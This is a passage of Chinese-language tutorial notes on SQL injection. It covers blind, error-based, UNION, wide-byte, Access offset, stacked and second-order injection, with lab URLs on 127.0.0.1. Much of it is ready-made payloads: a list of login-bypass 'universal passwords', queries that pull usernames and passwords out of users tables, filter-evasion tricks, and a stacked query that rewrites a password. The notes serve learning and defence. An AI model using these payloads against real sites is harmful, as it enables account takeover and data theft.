&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><code>X-Forwarded-For注入</code><br>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。<br>如果系统采用了服务器后端获取 X-Forwarded-For数据，如：利用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String ip = request.getHeader(&quot;X-Forwarded-For&quot;)</span><br></pre></td></tr></table></figure><p>进行获取ip，攻击者可以通过X-Forwarded-For请求头信息就行伪造ip，当然了这个ip<br>也可以是一些注入语句，如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For：1 and if(now()=sysdate(),sleep(6),0)--</span><br><span class="line">String sql = &quot;select * from table where ip = &#x27;&quot;+ip+&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>构造X-Forwoarded-For头进行测试，http响应出现变化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: -1&#x27; OR 3*2*1=6 AND 000958=000958--</span><br><span class="line">X-Forwarded-For: -1&#x27; OR 3*2*1=6 AND 000958=000957--</span><br></pre></td></tr></table></figure><p><code>⑤Request方式注入</code><br>概念：超全局变量 PHP中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可以用，这些超全局变量是：<br><code>$_REQUEST（获取GET/POST/COOKIE）COOKIE在新版本已经无法获取了 $_POST（获取POST传参） $_GET（获取GET传参） $_COOKIE（获取COOKIE传参） $_SERVER（包含了诸如头部信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组）</code></p><h4 id="3-按照执行效果来分类"><a href="#3-按照执行效果来分类" class="headerlink" title="3.按照执行效果来分类"></a>3.按照执行效果来分类</h4><p><code>①基于布尔的盲注</code></p><p>即可以根据返回页面判断条件真假的注入。盲注是注入的一种，指的是在不知道<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE&spm=1001.2101.3001.7020">数据</a>库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br><span class="line">if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br></pre></td></tr></table></figure><p>布尔型：页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据</p><p>报错型：构造payload让信息通过错误提示回显出来，一种类型（其它的暂时不怎么了解）是先报字段数，再利用后台数据库报错机制回显（跟一般的报错区别是，一般的报错注入是爆出字段数后，在此基础通过正确的查询语句，使结果回显到页面；后者是在爆出字段数的基础上使用能触发SQL报错机制的注入语句）</p><p><code>②基于时间的盲注，</code></p><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p><p>在SQL注入过程中，无论注入是否成功，页面完全没有变化。此时只能通过使用数据库的延时函数来判断注入点一般采用响应时间上的差异来判断是否存在SQL注入，即基于时间型的SQL盲注</p><p><code>③基于报错注入，</code></p><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p><p>updatexml报错注入</p><p>concat+rand()+group_by()导致主键重复</p><p><code>④联合查询注入</code></p><p>可以使用union的情况下的注入</p><p><code>⑤二次注入</code></p><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入</p><p><code>⑥堆查询注入</code></p><p>可以同时执行多条语句的执行时的注入。</p><p>在SQL中，分号（;）是用来表示一条sql语句的结束,堆叠注入可以执行任何人sql语句。但是当API或数据库引擎的不支持，堆叠注入就不能进行啦</p><h4 id="4-其他类型注入"><a href="#4-其他类型注入" class="headerlink" title="4.其他类型注入"></a>4.其他类型注入</h4><p><code>①Access偏移注入</code></p><p><code>②MongoDB 注入</code></p><p><code>③LDAP注入</code></p><p><code>④JSON注入</code></p><p><code>⑤DNSlog注入</code></p><p><code>⑥宽字节注入</code></p><p>具体怎么注入 后面学了在写</p><h3 id="联合攻击"><a href="#联合攻击" class="headerlink" title="联合攻击"></a>联合攻击</h3><p>通过union来进行攻击</p><p>‘union select 1,2,3–+ </p><p>‘union select 1,2,database()–+</p><p>‘union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+</p><p>‘union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’xxx’–+</p><p>‘union select 1,2,group_concat(a,b,c) from ‘xxx’–+</p><h3 id="堆叠攻击"><a href="#堆叠攻击" class="headerlink" title="堆叠攻击"></a>堆叠攻击</h3><p>在一处sql注入点同时执行两种命令   比如删库</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>用于无回显</p><p>判断库名长度–&gt;判断具体字符–&gt;判断表名长度–&gt;判断具体字符–&gt;判断字段名长度–&gt;查字段</p><p>主要会用：</p><p>ascii（）  查ascii码</p><p>length（）返回字符串长度</p><p>substr（）截取字符串</p><p>‘and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99–+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and length(database())&gt;5--+</span><br><span class="line">将&gt;号掉个方向看结果有没有变化，来判断布尔盲注有没有用，后面就继续猜表名，列名，然后内容。</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ttp://127.0.0.1/Less-8/?id=1&#x27;and (length(database()))&gt;10 --+</span><br><span class="line">and select length(database())&gt;n //判断数据库名长度</span><br><span class="line">and ascii(substr(database(),m,1))&gt;n //截取数据库名第m个字符并转换成ascii码 判断具体值</span><br></pre></td></tr></table></figure><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>跟布尔盲注一样</p><p>主要用：</p><p>sleep（）  使网页回复变慢</p><p>and   使条件同时成立</p><p>主要通过网页回复时间来判断前面的sql语句是否正确  慢就对</p><p>‘ and length(database())&#x3D;8 and sleep(10)–+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,name from product where id=1 and sleep(2)</span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>通过网页的报错获取目标信息</p><p>主要用：</p><p>floor（X） 返回一个效应X的值</p><p>extractvalue()   当xpath_string出现格式错误时，mysql爆出xpath语法错误</p><p>updatexml()    跟extractvalue()差不多</p><h6 id="其他用到的函数："><a href="#其他用到的函数：" class="headerlink" title="其他用到的函数："></a>其他用到的函数：</h6><p>group_concat      将数据连接起来</p><p>limit（x，y）   从第x开始取，取y个</p><p>mid       与substr 一样</p><p>ord      与ascii一样</p><p>left       从左向右取</p><p>into outfile   把xxxx写入指定文件中</p><h3 id="万用密码"><a href="#万用密码" class="headerlink" title="万用密码"></a>万用密码</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>万能密码利用的原理就是在后台登陆页面没有对用户输入的内容进行验证，此时程序所用用户输入的数据都合法的，所以这个时候无论是合法的管理员还是非法的入侵者所输入的数据都是被信任的，非法入侵者正是利用这一特点来进行非法登录的</p><p>账号：djlfjdslajdfj（随意输入）<br>密码：1‘or’1’&#x3D;‘1</p><ol><li>用户进行用户名和密码验证时，网站需要查询数据库。查询数据库就是执行SQL语句。用户登录时，后台执行的数据库查询操作（SQL语句）是：【Select user_id,user_type,email From users Where user_id&#x3D;’用户名’ And password&#x3D;’密码’】。</li><li>由于网站后台在进行数据库查询的时候没有对单引号进行过滤，当输入用户名【admin】和万能密码【2’or’1】时，执行的SQL语句为：【Select user_id,user_type,email From users Where user_id&#x3D;’admin’ And password&#x3D;’2’or’1’】。</li><li>由于SQL语句中逻辑运算符具有优先级，【&#x3D;】优先于【and】，【and】优先于【or】，且适用传递性。因此，此SQL语句在后台解析时，分成两句：【Select user_id,user_type,email From users Where user_id&#x3D;’admin’ And password&#x3D;’2’】和【’1’】，两句bool值进行逻辑or运算，恒为TRUE。SQL语句的查询结果为TRUE，就意味着认证成功，也可以登录到系统中。<br>输入用户名【admin】，密码【2’or’1】，即可登录成功。</li><li>在网站开发中也有些人是这样做的，T_users是表名，username是数据库中字段名，name和pwd是变量。<br>“select * form T_users where username&#x3D;’ “+ name +” ’ “+” and password&#x3D;’ “+ pwd +” ’ “;<br>如果变量name赋值为root，pwd变量赋值为root的话，这根本不会有什么问题，和上面一模一样。<br>即等价于”select * from T_users where username&#x3D; ‘root’ and password&#x3D; ‘root’ “<br>但是如果变量name赋值：随意输入，而pwd被赋值 1 or 1&#x3D;1 ，<br>那么整个语句就变成了这个样子：<br>“select from T_users where username&#x3D;‘adsfafsf’ and password&#x3D;‘1 or 1&#x3D;1’ “<br>可以看出，此时整个查询语句返回值始终为true.</li></ol><h4 id="常用万用密码"><a href="#常用万用密码" class="headerlink" title="常用万用密码"></a>常用万用密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">2： &#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">3：or 1=1--</span><br><span class="line">4：&#x27;or 1=1--</span><br><span class="line">5：a&#x27;or&#x27; 1=1--</span><br><span class="line">6：&quot;or 1=1--</span><br><span class="line">7：&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">8：&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">9：&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">10：&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">11：1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">12：1 or &#x27;1&#x27;=&#x27;1&#x27; or 1=1</span><br><span class="line">13： &#x27;OR 1=1%00</span><br><span class="line">14:&quot;)or(“a”=&quot;a</span><br><span class="line">15:‘or 1=1–</span><br><span class="line">16:“or 1=1–</span><br><span class="line">17:&#x27;or”=&#x27;</span><br><span class="line">18:&#x27;or 1=1/</span><br><span class="line">19:admin’ or 1=1/*</span><br></pre></td></tr></table></figure><h3 id="简单Bypass-绕过"><a href="#简单Bypass-绕过" class="headerlink" title="简单Bypass 绕过"></a>简单Bypass 绕过</h3><p>用编码改写特殊字符</p><p>关键字过滤：双写  大小写  替换</p><p>特殊字符过滤： 空格：内联取代  注释取代</p><p>​                           逗号：from for</p><p>参数混淆：加入更多的混淆参数，并改变注入位置</p><p>​                   用无效参数</p><p>​                   溢出</p><p>宽字节绕过</p><p>拼接字符串：’    concat     concat_ws     group_concat</p><p>函数替换</p><p>不能使用group_concat函数时，使limit语句来限制查询结果的列数</p><p>一、通过注释符绕过<br>注释符 # &#x2F;&#x2F;<br>通过在关键词的中间加入注释符，使关键词不被识别<br>如 select 改为 se&#x2F;&#x2F;lect</p><p>二、通过&lt;&gt;绕过<br>如 select 改为 sel&lt;&gt;ect</p><p>三、通过改变大小写绕过<br>四、如果and or被过滤<br>可以将and 用&amp;&amp; 替换<br>or 用 || 替换</p><p>五、通过重复关键词绕过<br>六、通过url编码绕过<br>七、等价函数与命令绕过<br>函数或变量</p><p>hex()、bin() &#x3D;&#x3D;&gt; ascii()<br>sleep() &gt;benchmark()<br>concat_ws()&gt;group_concat()<br>mid()、substr() &#x3D;&#x3D;&gt; substring()<br>@@user &#x3D;&#x3D;&gt; user()<br>@@datadir &#x3D;&#x3D;&gt; datadir()<br>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74　<br>或者：<br>substr((select ‘password’),1,1) &#x3D; 0x70<br>strcmp(left(‘password’,1), 0x69) &#x3D; 1<br>strcmp(left(‘password’,1), 0x70) &#x3D; 0<br>strcmp(left(‘password’,1), 0x71) &#x3D; -1</p><p>过滤逗号 join   </p><p>limit后面过滤逗号 from to</p><p>后面会写一个详细的整理清楚的bypass，这个写的太乱了</p><hr><h1 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h1><p> <code>报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。    报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</code></p><h2 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h2><p>Updatexml(): 函数是MYSQL对XML文档数据进行查询和修改的XPATH函数</p><p>extractvalue(): 函数也是MYSQL对XML文档数据进行查询和修改的XPATH函数</p><p>floor(): MYSQL中用于取整的函数</p><p>其他用于报错的函数还有10+种，但常用的就这三个</p><p>对于Updatexml()和extractvalue()我们就需要构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数，mysql就会报错</p><h3 id="Updatexml"><a href="#Updatexml" class="headerlink" title="Updatexml()"></a>Updatexml()</h3><p>Updatexml(xml_document,XPath_string,new_value)</p><p>它是一个内容替换函数，主要针对XML数据</p><p>第一个参数：是string格式，为xml文档对象名称，中文为Doc</p><p>第二个参数：XPath格式的字符串，用于匹配（与正则语法不同）</p><p>第三个参数：替换查找到的符合条件的数据</p><p>使用</p><blockquote><p>查询当前数据库的用户信息以及数据库版本信息:</p><p>?id&#x3D;1” and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) –+</p><p>获取当前数据库下数据表信息：</p><p>?id&#x3D;1” and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e),3) –+</p><p>获取users表名的列名信息：</p><p>?id&#x3D;1” and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),0x7e),3) –+</p><p>获取users数据表下username、password两列名的用户字段信息:</p><p>?id&#x3D;1” and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) –+</p><p>?id&#x3D;1” and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) –+</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br><span class="line">链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)</span><br><span class="line">链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</span><br><span class="line">爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line">爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line">爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line">爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1</span><br></pre></td></tr></table></figure><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>extractvalue(XML_document,XPath_string)</p><p>第一个参数：String格式，为XML文档对象名称</p><p>第二个参数：Xpath格式字符串</p><p>concat:返回结果为连接参数产生的字符串</p><p>使用</p><blockquote><p>获取当前是数据库名称及使用mysql数据库的版本信息：</p><p>?id&#x3D;1” and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) –+</p><p>获取当前位置所用数据库的位置：</p><p>?id&#x3D;1” and extractvalue(1,concat(0x7e,@@datadir,0x7e)) –+</p><p>获取表名：</p><p>?id&#x3D;1” and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)) –+</p><p>获取users表的列名：</p><p>?id&#x3D;1” and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),0x7e)) –+</p><p>获取对应的列名的信息(username&#x2F;password):</p><p>?id&#x3D;1” and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) –+</p></blockquote><h3 id="其他注入函数"><a href="#其他注入函数" class="headerlink" title="其他注入函数"></a>其他注入函数</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><p>exp(int)函数返回e的x次方，当x的值足够大的时候就会导致函数的结果数据类型溢出，也就会因此报错：”DOUBLE value is out of range”</p><p>?id&#x3D;1” and exp(~(select * from (select user())a)) –+<br>先查询select user()这个语句的结果，然后将查询出来的数据作为一个结果集取名为a</p><p>然后在查询select * from a 查询a，将结果集a全部查询出来</p><p>查询完成，语句成功执行，返回值为0，再取反(~按位取反运算符)，exp调用的时候e的那个数的次方，就会造成BigInt大数据类型溢出，就会报错</p><p>使用</p><blockquote><p>获取表名：</p><p>?id&#x3D;1” and exp(~(select * from (select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)a)) –+<br>获取列名：</p><p>?id&#x3D;1” and exp(~(select * from (select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1)a)) –+<br>获取列名对应信息：</p><p>?id&#x3D;1” and exp(~(select * from(select username from ‘users’ limit 0,1))) –+</p></blockquote><p><strong>适用mysql数据库版本是：5.5.5~5.5.49</strong></p><p>pow()之类的相似函数同样可以利用BigInt数据溢出的方式进行报错注入</p><h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>主键重复方式的报错注入利用的函数有： floor() + rand() + group() + count()</p><p>利用 <code>select count(*),(floor(rand(0)*2)) x from users group by x</code>这个相对固定的语句格式，导致的数据库报错</p><p>相关函数</p><p> rand()：是一个随机函数，通过一个固定的随机数的种子0之后，产生大于等于0小于1的伪随机序列</p><p>floor()：函数的作用就是返回小于等于括号内该值的最大整数，也就是取整。</p><p>group by：进行分组排序相同名字合并</p><p>count()：对a中的重复性的数据进行了整合，然后计数，后面的x就是每一类的数量</p><p>使用：</p><blockquote><p>?id&#x3D;1” and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)–+</p><p>and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+</p></blockquote><h4 id="各种报错注入的万能语句"><a href="#各种报错注入的万能语句" class="headerlink" title="各种报错注入的万能语句"></a>各种报错注入的万能语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过floor报错,注入语句如下:</span><br><span class="line">and select 1 from (select count(*),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过ExtractValue报错,注入语句如下:</span><br><span class="line">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过UpdateXml报错,注入语句如下:</span><br><span class="line">and 1=(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过NAME_CONST报错,注入语句如下:</span><br><span class="line">and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过join报错,注入语句如下:</span><br><span class="line">select * from(select * from mysql.user ajoin mysql.user b)c;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过exp报错,注入语句如下:</span><br><span class="line">and exp(~(select * from (select user () ) a) );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过GeometryCollection()报错,注入语句如下:</span><br><span class="line">and GeometryCollection(()select *from(select user () )a)b );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过polygon ()报错,注入语句如下:</span><br><span class="line">and polygon (()select * from(select user ())a)b );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过multipoint ()报错,注入语句如下:</span><br><span class="line">and multipoint (()select * from(select user() )a)b );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过multlinestring ()报错,注入语句如下:</span><br><span class="line">and multlinestring (()select * from(selectuser () )a)b );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过multpolygon ()报错,注入语句如下:</span><br><span class="line">and multpolygon (()select * from(selectuser () )a)b );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过linestring ()报错,注入语句如下:</span><br><span class="line">and linestring (()select * from(select user() )a)b );</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="前置-1"><a href="#前置-1" class="headerlink" title="前置"></a>前置</h2><p>单字节字符集： 所有的字符都使用一个字节来表示，比如 ASCII 编码。</p><p>多字节字符集： 在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</p><p>两位的多字节字符有一个前导字节和尾字节。 在某个多字节字符集内，前导字节位于某个特定范围内，尾字节也一样。</p><p>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</p><p>常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。</p><h2 id="注入条件"><a href="#注入条件" class="headerlink" title="注入条件"></a>注入条件</h2><p>要有宽字节注入漏洞</p><p>1、首先要满足目标程序使用双&#x2F;多字节字符集进行解析</p><p>2、其次不同字符集范围不一样，可能低位不包含单字节字符集的字符，这样就没办法了，所以要保证在该种字符集范围中包含低字节位，比如 0x5C(01011100) 的字符，即转义符\。</p><h2 id="理解与使用"><a href="#理解与使用" class="headerlink" title="理解与使用"></a>理解与使用</h2><p>宽字节带来的安全问题主要是吃ascll字符（一个字节）的现象</p><p>我们这里的宽字节注入是利用的MySQL的一个特性，<strong>MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字</strong>（前一个ASCII码要大于128，才到汉字的范围）。这就是MySQL的的特性，因为GBK是多字节编码，他认为两个字节代表一个汉字，所以％DF和后面的\也就是％5c中变成了一个汉字“运”，而“逃逸了出来。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当提交</span><br><span class="line">id=1&#x27; and 1=1%23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">时，MySQL的运行的SQL语句为</span><br><span class="line">select * from user where  id =&#x27;1\&#x27; and 1=1#&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">很明显这是没有注入成功的，而当我们提交</span><br><span class="line">id=1%df&#x27; and 1=1%23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MySQL的运行的SQL语句为</span><br><span class="line">select * from user where id =&#x27;1運&#x27; and 1=1#&#x27;</span><br></pre></td></tr></table></figure><p>也就是说%df-&gt;0xdf与\的十六进制编码拼接，被识别成’運’</p><p>有宽字节注入漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; or 1=1# 直接遍历</span><br></pre></td></tr></table></figure><p>宽字节注入常用于绕过一些转义的函数</p><p>当php,ini配置文件中添加<strong>magic_quotes_gpc&#x3D;on</strong> 或者使用使用一些转义函数，比如：addslashes(adf)和mysal_real_escape_string,他们会转义单引号、双引号、反斜杠与NUL（NULL字符），转义的方法是在符号前加\ 使SQL注入语句失效</p><p>此时可以用宽字节注入来绕过或不使用他们转义的符号来注入</p><h1 id="偏移量注入"><a href="#偏移量注入" class="headerlink" title="偏移量注入"></a>偏移量注入</h1><h2 id="前置-2"><a href="#前置-2" class="headerlink" title="前置"></a>前置</h2><p>偏移注入是access比较独有的一种注入手段</p><p>一般用于在猜出了表名但是没有猜出列名的情况下使用（无列名注入）</p><p>根据一个较多字段的表对一个少字段的表进行偏移注入</p><p><strong>原理：</strong>借用数据库的自连接查询（inner join）让数据库内部发生乱序，从而偏移出所需要的字段在我们的页面上显示。</p><p>通过我们补充的123，使两张表对齐，并通过移动*的位置，使我们需要的数据与页面所展示的数据对齐，进而将我们需要的数据展示出来</p><p><strong>用处（使用场景）：</strong>access偏移注入是解决一些注入不出来列表的时候，同时要求支持union select，列名足够多，需要知道表名。</p><p>在SQL注入的时候会遇到一些无法查询列名的问题，比如系统自带数据库的权限不够而无法访问系统自带库。</p><p>当你猜到表名无法猜到字段名的情况下，我们可以使用偏移注入来查询那张表里面的数据。</p><p>像Sqlmap之类的工具实际上是爆破字段的名字，但是如果字段名称比较奇葩，就无可奈何了</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul><li>知道表名,但不知道列名</li><li>支持联合查询</li><li>联合查询前面的查询语句列数要比注入的union后面的查询的列数要多</li></ul><h2 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h2><p>1、判断注入点</p><p>2、查询字段个数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/asp/index.asp?id=1513 order by 22 正常</span><br><span class="line">127.0.0.1/asp/index.asp?id=1513 order by 23 错误</span><br></pre></td></tr></table></figure><p>3、爆出显位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</span><br></pre></td></tr></table></figure><p>4、判断表内存在的字段个数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* from admin 错误</span><br><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,* from admin 错误</span><br><span class="line"></span><br><span class="line">直到</span><br><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin 正确</span><br></pre></td></tr></table></figure><p>所以admin表下有6个字段</p><p>6+16&#x3D;22</p><p><code>在中间使用*时，要用表名.*  即1,2,3,admin.*,4,5,6</code></p><p>特：</p><blockquote><p>在某些情况下，通过偏移注入，我们获取不到想要的数据怎么办，</p><p>假设表中存在id字段</p><p>首先给表重命名 admin as a   admin as b</p><p>获取id 一样的字段 admin as a inner join admin as b on a.id&#x3D;b.id 这样做我们可以打乱随机顺序，不过这样之后作为一个整体查询，字段数要乘以2</p><p>payload：union select 1,2,(admin as a inner join admin as b on a.id&#x3D;b.id).* from admin</p></blockquote><p>5.爆列名数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一级偏移语句：</span><br><span class="line"></span><br><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)</span><br><span class="line"></span><br><span class="line">如果你发现，上面查看了网页源码也爆不出数据，请用以下方法：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二级偏移语句：</span><br><span class="line"></span><br><span class="line">127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join a</span><br></pre></td></tr></table></figure><p>偏移注入的基本公式为:<br> order by 出的字段数减去号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案</p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><h2 id="前置-3"><a href="#前置-3" class="headerlink" title="前置"></a>前置</h2><p>可以同时执行多条语句的执行时的注入</p><p>在SQL中，分号（;）是用来表示一条sql语句的结束</p><p>堆叠注入可以执行的是任意的语句 而union injection执行的语句类型是有限的，可以用来执行查询语句</p><h2 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h2><p>更新id&#x3D;1的用户密码为123456</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;;update users set password=&#x27;123456&#x27; where id=1; --+ </span><br></pre></td></tr></table></figure><p>还可以用于删库等一系列sql命令，不止局限于查询</p><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。如上面的实例如果我们不输出密码那我们是看不到这个结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息</p><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><h2 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h2><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p><p>第一次注入 第二次触发</p><p><img src="https://bu.dusays.com/2024/05/13/6641605d07042.png" 